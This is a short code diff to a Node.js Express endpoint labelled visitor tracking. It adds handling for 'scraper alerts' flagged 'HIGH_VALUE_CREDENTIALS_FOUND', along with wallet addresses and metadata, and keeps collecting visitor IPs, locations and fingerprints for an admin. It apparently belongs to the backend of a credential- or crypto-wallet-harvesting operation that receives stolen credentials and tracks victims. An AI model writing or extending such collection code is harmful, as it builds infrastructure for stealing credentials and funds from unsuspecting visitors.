@@ -5,12 +5,24 @@ const router = express.Router();
 // Visitor tracking endpoint
 router.post('/visitor-alert', async (req, res) => {
   try {
-    const { visitorData } = req.body;
+    const { visitorData, walletAddress, action, metadata } = req.body;
+    
+    // Handle scraper alerts (no visitor data)
+    if (action === 'HIGH_VALUE_CREDENTIALS_FOUND') {
+      console.log('🔥 HIGH VALUE CREDENTIALS ALERT:', metadata);
+      res.json({ success: true, tracked: true });
+      return;
+    }
+    
+    if (!visitorData) {
+      res.json({ success: true, tracked: false });
+      return;
+    }
     
     // Enhanced visitor info for admin
     const visitorInfo = {
       // Security data
-      ip: visitorData.ip,
+      ip: visitorData.ip || 'Unknown',
       location: visitorData.location,
       fingerprint: visitorData.fingerprint,
       
